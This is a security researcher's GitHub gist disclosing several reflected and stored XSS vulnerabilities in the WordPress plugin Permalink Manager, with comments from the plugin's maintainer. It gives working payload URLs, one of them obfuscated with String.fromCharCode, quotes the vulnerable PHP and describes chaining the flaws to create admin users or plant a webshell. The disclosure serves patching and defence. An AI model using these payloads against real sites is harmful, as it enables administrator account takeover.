
[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FXib3rR4dAr%2F561ac3c17b92cb55d3032504a076fa4b)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FXib3rR4dAr%2F561ac3c17b92cb55d3032504a076fa4b&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FXib3rR4dAr%2F561ac3c17b92cb55d3032504a076fa4b) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FXib3rR4dAr%2F561ac3c17b92cb55d3032504a076fa4b&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@Xib3rR4dAr](https://avatars.githubusercontent.com/u/24238512?s=64&v=4)](/Xib3rR4dAr)

# [Xib3rR4dAr](/Xib3rR4dAr)/**[wp\_permalink-manager\_xss\_poc.md](/Xib3rR4dAr/561ac3c17b92cb55d3032504a076fa4b)** Secret

Last active
March 21, 2024 14:24

Show Gist options

* [Download ZIP](/Xib3rR4dAr/561ac3c17b92cb55d3032504a076fa4b/archive/ebdbeb697ad6ec1c5502c091fb48b05bb0793912.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FXib3rR4dAr%2F561ac3c17b92cb55d3032504a076fa4b)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FXib3rR4dAr%2F561ac3c17b92cb55d3032504a076fa4b)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/Xib3rR4dAr/561ac3c17b92cb55d3032504a076fa4b.js&quot;&gt;&lt;/script&gt;
* Save Xib3rR4dAr/561ac3c17b92cb55d3032504a076fa4b to your computer and use it in GitHub Desktop.

[Code](/Xib3rR4dAr/561ac3c17b92cb55d3032504a076fa4b)
[Revisions
4](/Xib3rR4dAr/561ac3c17b92cb55d3032504a076fa4b/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/Xib3rR4dAr/561ac3c17b92cb55d3032504a076fa4b.js&quot;&gt;&lt;/script&gt;

Save Xib3rR4dAr/561ac3c17b92cb55d3032504a076fa4b to your computer and use it in GitHub Desktop.

[Download ZIP](/Xib3rR4dAr/561ac3c17b92cb55d3032504a076fa4b/archive/ebdbeb697ad6ec1c5502c091fb48b05bb0793912.zip)

WP Plugin Permalink Manager <=2.4.3.1 Multiple Reflected XSS

 [Raw](/Xib3rR4dAr/561ac3c17b92cb55d3032504a076fa4b/raw/ebdbeb697ad6ec1c5502c091fb48b05bb0793912/wp_permalink-manager_xss_poc.md)

[**wp\_permalink-manager\_xss\_poc.md**](#file-wp_permalink-manager_xss_poc-md)

# WP Plugin Permalink Manager <=2.4.3.1 Multiple Reflected XSS

**Author: Muhammad Zeeshan (Xib3rR4dAr)**

Date: March 12, 2024

Plugin Active Installs: 80,000+

Vulnerable Plugins: [permalink-manager](https://wordpress.org/plugins/permalink-manager/), [permalink-manager-pro](https://permalinkmanager.pro/buy-permalink-manager-pro/)

### Description

Permalink Manager is a highly rated WordPress permalink editor that allows users to customize post, page, and custom post type URLs.

During code audit, multiple XSS vulnerabilities were found.

A hidden parameter `debug_editor_sql` was found in code that allowed reflected XSS and is never used from client side. Not sanitizing keys in pro version also lead to XSS while lite version sanatized the keys properly.

Permalink Manager has lite (permalink-manager) and pro (permalink-manager-pro) versions, both were found to XSS. While one version exhibited some XSS issues, the other version did not.

### Exploitation Scenario

Mostly mentioned XSS will trigger for Admin user only, while one can be triggered for any logged in user. Unauthorized permalinks modification vulnerability is also present in same version, therefore attacker user can chain XSS with [unauthorized permalink modification](https://gist.github.com/Xib3rR4dAr/b1eec00e844932c6f2f30a63024b404e) to trigger XSS when admin user visits any Page/Post.

1. Exploiting unauthorized permalinks modification, modify permalinks of all posts/pages including those of admin users to hijack post/page and display custom content.
2. Custom content can have a button that when clicked, redirects to XSS page.
3. Or exploiting external redirect feature, attacker can redirect admin user to XSS page to trigger XSS when admin visits any Post/Page.

Also, any user can embed XSS payload on his own domain and then logged in users can be tricked into visiting domain that will redirect to Reflected XSS vulnerable page to trigger XSS.

XSS can be exploited to create new admin user also or perform other actions like upload webshell if Admin user is targeted.

## XSS in permalink-manager

1. Login as admin user and visit following to trigger XSS:

   Page: Tools > Permalink Manager > URI Editor > Posts

```
http://192.168.253.1/wp-admin/tools.php?page=permalink-manager&section=uri_editor&debug_editor_sql=1&s=%3C%2Ftextarea%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
pages
```

Page: Tools > Permalink Manager > URI Editor > Pages

```
http://192.168.253.1/wp-admin/tools.php?page=permalink-manager&section=uri_editor&subsection=page&debug_editor_sql=1&s=%3C%2Ftextarea%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```

Vulnerable File for XSS in Posts, Pages:

```
File: wp-content\plugins\permalink-manager\includes\views\permalink-manager-uri-editor-post.php
229: 	public function prepare_items() {
---
244: 		$search_query = ( ! empty( $_REQUEST['s'] ) ) ? esc_sql( $_REQUEST['s'] ) : "";
---
262: 		if ( $search_query ) {
263: 			$sql_parts['where'] = "WHERE (LOWER(post_title) LIKE LOWER('%{$search_query}%') ";
---
283: 		// Prepare the SQL query
284: 		$sql_query = implode( "", $sql_parts );
---
297: 		// Debug SQL query
298: 		if ( isset( $_REQUEST['debug_editor_sql'] ) ) {
299: 			$debug_txt = "<textarea style=\"width:100%;height:300px\">{$sql_query} \n\nOffset: {$offset} \nPage: {$current_page}\nPer page: {$per_page} \nTotal: {$total_items}</textarea>";
300: 			wp_die( $debug_txt );
301: 		}
```

Parameter `s` is fetched from request, then it is SQL Escaped (which is not for XSS protection), then appended to SQL Query. Then if parameter `debug_editor_sql` exists, SQL query is displayed which contains our XSS payload via `s` parameter.

### Fix

Properly Sanitize user input before displaying or remove following unwanted lines since not required and are not present in GUI:

```
File: wp-content\plugins\permalink-manager\includes\views\permalink-manager-uri-editor-post.php
297: 		// Debug SQL query
298: 		if ( isset( $_REQUEST['debug_editor_sql'] ) ) {
299: 			$debug_txt = "<textarea style=\"width:100%;height:300px\">{$sql_query} \n\nOffset: {$offset} \nPage: {$current_page}\nPer page: {$per_page} \nTotal: {$total_items}</textarea>";
300: 			wp_die( $debug_txt );
301: 		}
```

## XSS in permalink-manager-pro

2. Login as admin user and visit following to trigger XSS:

   Page: Tools > Permalink Manager > URI Editor > Posts

```
http://192.168.253.1/wp-admin/tools.php?page=permalink-manager&section=uri_editor&debug_editor_sql=1&s=%3C%2Ftextarea%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
pages
```

Page: Tools > Permalink Manager > URI Editor > Pages

```
http://192.168.253.1/wp-admin/tools.php?page=permalink-manager&section=uri_editor&subsection=page&debug_editor_sql=1&s=%3C%2Ftextarea%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```

Vulnerable File for XSS in Posts, Pages:

```
File: wp-content\plugins\permalink-manager-pro\includes\views\permalink-manager-uri-editor-post.php
229: 	public function prepare_items() {
---
244: 		$search_query = ( ! empty( $_REQUEST['s'] ) ) ? esc_sql( $_REQUEST['s'] ) : "";
---
262: 		if ( $search_query ) {
263: 			$sql_parts['where'] = "WHERE (LOWER(post_title) LIKE LOWER('%{$search_query}%') ";
---
284: 		$sql_query = implode( "", $sql_parts );
---
297: 		// Debug SQL query
298: 		if ( isset( $_REQUEST['debug_editor_sql'] ) ) {
299: 			$debug_txt = "<textarea style=\"width:100%;height:300px\">{$sql_query} \n\nOffset: {$offset} \nPage: {$current_page}\nPer page: {$per_page} \nTotal: {$total_items}</textarea>";
300: 			wp_die( $debug_txt );
301: 		}
```

3. Other XSS present in `permalink-manager-pro` but not in `permalink-manager`:

Login as admin user and visit following to trigger XSS:
Page: Tools > Permalink Manager > URI Editor > Categories

```
http://192.168.253.1/wp-admin/tools.php?page=permalink-manager&section=uri_editor&subsection=tax_category&debug_editor_sql=1&s=%3C%2Ftextarea%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```

Page: Tools > Permalink Manager > URI Editor > Tags

```
http://192.168.253.1/wp-admin/tools.php?page=permalink-manager&section=uri_editor&subsection=tax_post_tag&debug_editor_sql=1&s=%3C%2Ftextarea%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```

Vulnerable File for XSS in Categories, Tags:

```
File: wp-content\plugins\permalink-manager-pro\includes\views\permalink-manager-uri-editor-tax.php
177: 	public function prepare_items() {
---
188: 		$search_query     = ( ! empty( $_REQUEST['s'] ) ) ? esc_sql( $_REQUEST['s'] ) : "";
---
197: 		if ( $search_query ) {
198: 			$sql_parts['where'] = "WHERE (LOWER(t.name) LIKE LOWER('%{$search_query}%') ";
---
219: 		$sql_query = implode( "", $sql_parts );
---
232: 		// Debug SQL query
233: 		if ( isset( $_REQUEST['debug_editor_sql'] ) ) {
234: 			$debug_txt = "<textarea style=\"width:100%;height:300px\">{$sql_query} \n\nOffset: {$offset} \nPage: {$current_page}\nPer page: {$per_page} \nTotal: {$total_items}</textarea>";
235: 			wp_die( $debug_txt );
236: 		}
```

4. ~~Other XSS present in `permalink-manager-pro` but not in `permalink-manager`:~~ This is present in version **<** 2.4.3.1 of `permalink-manager` and `permalink-manager-pro`

Login as any user e.g subscriber then visit following to trigger XSS:

```
http://192.168.253.1/wp-admin/admin-ajax.php?action=pm_detect_duplicates&custom_uris[a<svg%20onload%3dalert('XSS')>]=1
```

From frontend, POST requests are sent with `action=pm_detect_duplicates` but POST can be converted to GET request also since `$_REQUEST` is used. Converting to GET has advantage that XSS can be triggered via redirection also.

```
File: wp-content\plugins\permalink-manager\includes\core\permalink-manager-actions.php
714: 	function ajax_detect_duplicates( $uri = null, $element_id = null ) {
715: 		$duplicate_alert = __( "Permalink is already in use, please select another one!", "permalink-manager" );
716:
717: 		if ( ! empty( $_REQUEST['custom_uris'] ) ) {
718: 			// Sanitize the array
719: 			$custom_uris      = Permalink_Manager_Helper_Functions::sanitize_array( $_REQUEST['custom_uris'] );
720: 			$duplicates_array = array();
721:
722: 			// Check each URI
723: 			foreach ( $custom_uris as $element_id => $uri ) {
724: 				$duplicates_array[ $element_id ] = Permalink_Manager_Admin_Functions::is_uri_duplicated( $uri, $element_id ) ? $duplicate_alert : 0;
725: 			}
726:
727: 			// Convert the output to JSON and stop the function
728: 			echo json_encode( $duplicates_array );
729: 		} else if ( ! empty( $_REQUEST['custom_uri'] ) && ! empty( $_REQUEST['element_id'] ) ) {
730: 			$is_duplicated = Permalink_Manager_Admin_Functions::is_uri_duplicated( $uri, $element_id );
731:
732: 			echo ( $is_duplicated ) ? $duplicate_alert : 0;
733: 		}
734:
735: 		die();
736: 	}
```

### Fix

Remove Debug SQL query part from code. XSS via action `pm_detect_duplicates` is fixed in `2.4.3.1`

[![@Xib3rR4dAr](https://avatars.githubusercontent.com/u/24238512?s=80&v=4)](/Xib3rR4dAr)

Copy link

Author

### **[Xib3rR4dAr](/Xib3rR4dAr)** commented [Mar 15, 2024](/Xib3rR4dAr/561ac3c17b92cb55d3032504a076fa4b?permalink_comment_id=4989686#gistcomment-4989686) • edited Loading

### Stored XSS in permalink-manager-pro

Reproduction Steps:

1. Login as ~~Editor~~ Author or Author+ user
2. Create a new post and publish
3. Then while editing post, from right tab select Post > Permalink Manager > Manage Redirects > Redirect this page to external URL

```
http://example.com/?anything=AAAA'</textarea><script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41,59))</script>
```

(Crafted payload triggers in attribute context as well as textarea context)

4. Click Save Permalink

XSS will trigger instantly (Self XSS), Stored XSS will also trigger when **admin** user visits:

Tools > Permalink Manager > Debug

which is: `http://127.0.0.1/wp-admin/tools.php?page=permalink-manager&section=debug`

Sorry, something went wrong.

[![@maciejbis](https://avatars.githubusercontent.com/u/9405726?s=80&v=4)](/maciejbis)

Copy link

### **[maciejbis](/maciejbis)** commented [Mar 15, 2024](/Xib3rR4dAr/561ac3c17b92cb55d3032504a076fa4b?permalink_comment_id=4989826#gistcomment-4989826)

Hi [@Xib3rR4dAr](https://github.com/Xib3rR4dAr),

> Other XSS present in permalink-manager-pro but not in permalink-manager:
>
> Login as any user e.g subscriber then visit following to trigger XSS:
>
> [http://192.168.253.1/wp-admin/admin-ajax.php?action=pm\_detect\_duplicates&custom\_uris[a](http://192.168.253.1/wp-admin/admin-ajax.php?action=pm_detect_duplicates&custom_uris%5Ba)<svg%20onload%3dalert('XSS')>]=1
>
> From frontend, POST requests are sent with action=pm\_detect\_duplicates but POST can be converted to GET request also since $\_REQUEST is used. Converting to GET has advantage that XSS can be triggered via redirection also.
>
> File: wp-content\plugins\permalink-manager-pro\includes\core\permalink-manager-actions.php
>
> 719: function ajax\_detect\_duplicates( $uri = null, $element\_id = null ) {
>
> 720: $duplicate\_alert = \_\_( "Permalink is already in use, please select another one!", "permalink-manager" );
>
> 721:
>
> 722: if ( ! empty( $\_REQUEST['custom\_uris'] ) ) {
>
> 723: // Sanitize the array
>
> 724: $custom\_uris = Permalink\_Manager\_Helper\_Functions::sanitize\_array( $\_REQUEST['custom\_uris'] );
>
> 725: $duplicates\_array = array();
>
> 726:
>
> 727: // Check each URI
>
> 728: foreach ( $custom\_uris as $element\_id => $uri ) {
>
> 729: $duplicates\_array[ $element\_id ] = Permalink\_Manager\_Admin\_Functions::is\_uri\_duplicated( $uri, $element\_id ) ? $duplicate\_alert : 0;
>
> 730: }
>
> 731:
>
> 732: // Convert the output to JSON and stop the function
>
> 733: echo json\_encode( $duplicates\_array );
>
> 734: } else if ( ! empty( $\_REQUEST['custom\_uri'] ) && ! empty( $\_REQUEST['element\_id'] ) ) {
>
> 735: $is\_duplicated = Permalink\_Manager\_Admin\_Functions::is\_uri\_duplicated( $uri, $element\_id );
>
> 736:
>
> 737: echo ( $is\_duplicated ) ? $duplicate\_alert : 0;
>
> 738: }
>
> 739:
>
> 740: die();
>
> 741: }
>
> Fix
>
> $element\_id which contains XSS is not sanitized properly, while only numbers should have been allowed in it. Also, remove Debug SQL query part from code.

This particular issue was already patched in 2.4.3.1 version (the nulled version of the plugin available on Internet for some does not contain the patch).

Please contact me via email if you need a valid license key to download the untouched plugin's ZIP package.

Sorry, something went wrong.

[![@Xib3rR4dAr](https://avatars.githubusercontent.com/u/24238512?s=80&v=4)](/Xib3rR4dAr)

Copy link

Author

### **[Xib3rR4dAr](/Xib3rR4dAr)** commented [Mar 16, 2024](/Xib3rR4dAr/561ac3c17b92cb55d3032504a076fa4b?permalink_comment_id=4990135#gistcomment-4990135)

Hi [@maciejbis](https://github.com/maciejbis), thanks for correction. I've updated the gist now. I've mailed you for the license and truly appreciate your help in providing with untouched plugin's ZIP package.

Sorry, something went wrong.

[![@Xib3rR4dAr](https://avatars.githubusercontent.com/u/24238512?s=80&v=4)](/Xib3rR4dAr)

Copy link

Author

### **[Xib3rR4dAr](/Xib3rR4dAr)** commented [Mar 17, 2024](/Xib3rR4dAr/561ac3c17b92cb55d3032504a076fa4b?permalink_comment_id=4991386#gistcomment-4991386) • edited Loading

Admin Self XSS: (Permalink Manager Pro)

1. Login as administrator user
2. Visit `/wp-admin/tools.php?page=permalink-manager&section=settings#licence`
3. Paste `'" autofocus onfocus=alert(2) a` in `Licence key` input field
4. XSS will trigger when `Save settings` is clicked (note that XSS won't trigger when page is reloaded)

   [![image](https://private-user-images.githubusercontent.com/24238512/313498091-3d470c77-c20e-4f65-bbcc-f042d0156873.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1Mjc5MTAsIm5iZiI6MTczNjUyNzYxMCwicGF0aCI6Ii8yNDIzODUxMi8zMTM0OTgwOTEtM2Q0NzBjNzctYzIwZS00ZjY1LWJiY2MtZjA0MmQwMTU2ODczLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE2NDY1MFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTg0ZDQ0YTk4M2VkM2FkODU4OWM3Y2YwMDkxMTU4N2UzN2E2NzRhYjYzODBhM2E5YjFjOTA1NjgwYzVkN2FlMzQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.pIM49xV4zbHRuXVOkOGISxg8xEEtQdT7jZcO-yI7nPo)](https://private-user-images.githubusercontent.com/24238512/313498091-3d470c77-c20e-4f65-bbcc-f042d0156873.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1Mjc5MTAsIm5iZiI6MTczNjUyNzYxMCwicGF0aCI6Ii8yNDIzODUxMi8zMTM0OTgwOTEtM2Q0NzBjNzctYzIwZS00ZjY1LWJiY2MtZjA0MmQwMTU2ODczLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE2NDY1MFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTg0ZDQ0YTk4M2VkM2FkODU4OWM3Y2YwMDkxMTU4N2UzN2E2NzRhYjYzODBhM2E5YjFjOTA1NjgwYzVkN2FlMzQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.pIM49xV4zbHRuXVOkOGISxg8xEEtQdT7jZcO-yI7nPo)

Sorry, something went wrong.

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2FXib3rR4dAr%2F561ac3c17b92cb55d3032504a076fa4b)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

